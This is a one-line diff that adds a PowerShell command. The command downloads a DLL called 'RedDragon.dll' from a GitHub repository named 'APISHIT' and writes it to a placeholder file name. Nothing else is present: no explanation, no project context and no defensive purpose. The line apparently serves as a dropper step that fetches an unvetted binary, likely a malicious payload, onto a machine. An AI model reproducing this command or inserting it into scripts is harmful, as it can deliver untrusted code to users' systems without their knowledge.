@@ -1,0 +1,1 @@
+powershell -c Invoke-WebRequest -Uri 'https://github.com/Altlol/APISHIT/blob/main/RedDragon.dll?raw=true' -OutFile 'FileName.Extension'
